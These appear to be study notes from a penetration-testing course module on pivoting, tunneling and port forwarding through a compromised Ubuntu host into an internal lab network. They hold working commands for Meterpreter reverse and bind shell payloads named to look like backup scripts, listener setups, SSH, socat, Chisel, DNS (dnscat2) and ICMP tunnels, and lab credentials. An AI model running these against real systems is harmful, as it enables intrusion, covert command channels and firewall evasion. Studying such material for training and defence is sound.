# Introduction to Pivoting, Tunneling, and Port Forwarding
## Lateral Movement, Pivoting, and Tunneling Compared

Lateral Movement
Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts.

Pivoting
Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.


Tunneling
We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected.

To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. Keep this comparison in mind while moving through this module.


# Dynamic Port Forwarding with SSH and SOCKS Tunneling
## Port Forwarding in Context
Port forwarding is a technique that allows us to redirect a communication request from one port to another. 

![port_forward](image.png)

**Scanning the Pivot Target**

    nmap -sT -p22,3306 10.129.202.64

**Executing the Local Port Forward**

    ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. 

**Confirming Port Forward**

    netstat -antp | grep 1234                  #with netstat
    nmap -v -sV -p1234 localhost               #with nmap

**Forwarding Multiple Ports**

    ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

**Setting up to Pivot** 

Now, if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs:

-  One connected to our attack host (ens192)
-  One communicating to other hosts within a different network (ens224)
-  The loopback interface (lo).


we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host

![Proxychain](image-1.png)

**Enabling Dynamic Port Forwarding with SSH**

    ssh -D 9050 ubuntu@10.129.202.64

The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together.

To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line

Now when you start tool with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.

    proxychains nmap -v -sn 172.16.5.1-200                   #NMAP

NOTE: that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.


**Enumerating the Windows Target through Proxychains**

    proxychains nmap -v -Pn -sT 172.16.5.19

**Using Metasploit with Proxychains**

    proxychains msfconsole

**Using xfreerdp with Proxychains**

    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123



# Remote/Reverse Port Forwarding with SSH

![alt text](image-2.png)

**But what happens if we try to gain a reverse shell?**
The outgoing connection for the Windows host is only limited to the 172.16.5.0/23 network. This is because the Windows host does not have any direct connection with the network the attack host is on. so we cannot get the direct connection from the window host.

**Creating a Windows Payload with msfvenom**

    msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

**Configuring & Starting the multi/handler**

    use exploit/multi/handler

    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8000
    lport => 8000
    msf6 exploit(multi/handler) > run

**Transferring Payload to Pivot Host**

    scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

**Starting Python3 Webserver on Pivot Host**

    ubuntu@Webserver$ python3 -m http.server 8123

**Downloading Payload from Windows Target**

    PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.

    ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN


After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener,


![pivotForMetepreter](image-3.png)

# Meterpreter Tunneling & Port Forwarding

***we can still create a pivot with our Meterpreter session without relying on SSH port forwarding.***

**Creating Payload for Ubuntu Pivot Host**

    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.

    use exploit/multi/handler
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8080
    lport => 8080
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    payload => linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler on 0.0.0.0:8080

We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session. we get the connecttion from out pivit host.


## senario
We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. 

**Ping Sweep**

    meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range

**Ping Sweep For Loop on**

    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done                    #linux host
    for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"                        #CMD
    1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}       #POEWRSHELL


## Senario 2
There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. 

**Configuring MSF's SOCKS Proxy**


    msf6 > use auxiliary/server/socks_proxy

    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    SRVPORT => 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    SRVHOST => 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    version => 4a
    msf6 auxiliary(server/socks_proxy) > run
    [*] Auxiliary module running as background job 0.

**Confirming Proxy Server is Running**

    msf6 auxiliary(server/socks_proxy) > jobs

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host.

    socks4 	127.0.0.1 9050        #ADD this at last proxychains.conf

**Creating Routes with AutoRoute**

    use post/multi/manage/autoroute

    msf6 post(multi/manage/autoroute) > set SESSION 1
    SESSION => 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    SUBNET => 172.16.5.0
    msf6 post(multi/manage/autoroute) > run

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

    meterpreter > run autoroute -s 172.16.5.0/23

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.

    run autoroute -p

**Testing Proxy & Routing Functionality**

    proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn


## Port Forwarding

Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network

**Creating Local TCP Relay**

    meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

**Connecting to Windows Target through localhost**

    xfreerdp /v:localhost:3300 /u:victor /p:pass@123

    netstat -antp

## Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.

**Reverse Port Forwarding Rules**

    meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

**Configuring & Starting multi/handler**

    meterpreter > bg

    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LPORT 8081 
    LPORT => 8081
    msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
    LHOST => 0.0.0.0
    msf6 exploit(multi/handler) > run

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.  

**Generating the Windows Payload**

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234


# Socat Redirection with a Reverse Shell

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Pivit server.

**Starting Socat Listener**
    
    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). 

**Creating the Windows Payload**

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.

**Starting MSF Console**

    sudo msfconsole


**Configuring & Starting the multi/handler**

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 80
    lport => 80
    msf6 exploit(multi/handler) > run

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

# Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![blind](image-4.png)

**Creating the Windows Payload**

    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

**Starting Socat Bind Shell Listener on pivit server**

    socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

**Configuring & Starting the Bind multi/handler**

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
    payload => windows/x64/meterpreter/bind_tcp
    msf6 exploit(multi/handler) > set RHOST 10.129.202.64
    RHOST => 10.129.202.64
    msf6 exploit(multi/handler) > set LPORT 8080
    LPORT => 8080
    msf6 exploit(multi/handler) > run

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.


# SSH for Windows: plink.exe
Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.

![PLINK](image-5.png)

**Using Plink.exe**

    plink -ssh -D 9050 ubuntu@10.129.15.50

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

![PROXIFIER](image-6.png)

# SSH Pivoting with Sshuttle
Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers

    sudo apt-get install sshuttle                                  #install

To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

    sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 


**Traffic Routing through iptables Routes**

    nmap -v -sV -p3389 172.16.5.19 -A -Pn



# Web Server Pivoting with Rpivot

Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

![RPoVIT](image-7.png)


    sudo git clone https://github.com/klsecservices/rpivot.git         #clone the repo
    sudo apt-get install python2.7                                     # install python 2.7


**Running server.py from the Attack Host**

    python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0


Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:

    scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

    python2.7 client.py --server-ip 10.10.14.18 --server-port 9999         # run client.py on tareget   

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

    proxychains firefox-esr 172.16.5.135:80

**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**

    python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

# Port Forwarding with Windows Netsh

Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

-  Finding routes
-  Viewing the firewall configuration
-  Adding proxies
-  Creating port forwarding rules

![NETSH](image-8.png)

**Using Netsh.exe to Port Forward**

    C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

**Verifying Port Forward**
  
    C:\Windows\system32> netsh.exe interface portproxy show v4tov4

After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

# DNS Tunneling with Dnscat2

Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

**Setting Up & Using dnscat2**

    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server/
    sudo gem install bundler
    sudo bundle install

**Starting the dnscat2 server**

    sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

**Cloning dnscat2-powershell to the Attack Host**

    git clone https://github.com/lukebaggett/dnscat2-powershell.git

Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.

    PS C:\htb> Import-Module .\dnscat2.ps1
    PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

**Listing dnscat2 Options**

    dnscat2> ?
    dnscat2> window -i 1


# SOCKS5 Tunneling with Chisel

Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. 

**Setting Up & Using Chisel**

    git clone https://github.com/jpillora/chisel.git    
    cd chisel
    go build

**Transferring Chisel Binary to Pivot Host**
    
    scp chisel ubuntu@10.129.202.64:~/

**Running the Chisel Server on the Pivot Host**

    ./chisel server -v -p 1234 --socks5

We can start a client on our attack host and connect to the Chisel server.

**Connecting to the Chisel Server**

    ./chisel client -v 10.129.202.64:1234 socks

Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

## Chisel Reverse Pivot

**Starting the Chisel Server on our Attack Host**

    sudo ./chisel server --reverse -v -p 1234 --socks5

**Connecting the Chisel Client to our Attack Host**

    ./chisel client -v 10.10.14.17:1234 R:socks

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.


    [ProxyList]
    # add proxy here ...
    # socks4    127.0.0.1 9050
    socks5 127.0.0.1 1080 

    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123


# ICMP Tunneling with SOCKS
ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. 

We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. 

**Setting Up & Using ptunnel-ng**

    git clone https://github.com/utoni/ptunnel-ng.git

**Building Ptunnel-ng with Autogen.sh**

    sudo ./autogen.sh 

**Transferring Ptunnel-ng to the Pivot Host**

    scp -r ptunnel-ng ubuntu@10.129.202.64:~/

**Starting the ptunnel-ng Server on the Target Host**


    sudo ./ptunnel-ng -r10.129.202.64 -R22

**Connecting to ptunnel-ng Server from Attack Host**

    sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

**Tunneling an SSH connection through an ICMP Tunnel**

    ssh -p2222 -lubuntu 127.0.0.1

**Enabling Dynamic Port Forwarding over SSH**

    ssh -D 9050 -p2222 -lubuntu 127.0.0.1

**Proxychaining through the ICMP Tunnel**

    proxychains nmap -sV -sT 172.16.5.19 -p3389

# RDP and SOCKS Tunneling with SocksOverRDP


There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. However, this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server. 

**Loading SocksOverRDP.dll using regsvr32.exe**

    C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

    C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080

After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port.


With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.


we can access the Experience tab in mstsc.exe and set Performance to Modem. if rdp is slow or not responding then do this.


# preventation

Things to Document and Track
- DNS records, network device backups, and DHCP configurations
- Full and current application inventory
- A list of all enterprise hosts and their location
- Users who have elevated permissions
- A list of any dual-homed hosts (More than one network interface)
- Keeping a visual network diagram of your environment

Netbrain is an excellent example of one tool that can provide this functionality and interactive access to all appliances in the diagram. If we want a way to document our network environment visually, we can use a free tool like diagrams.net. 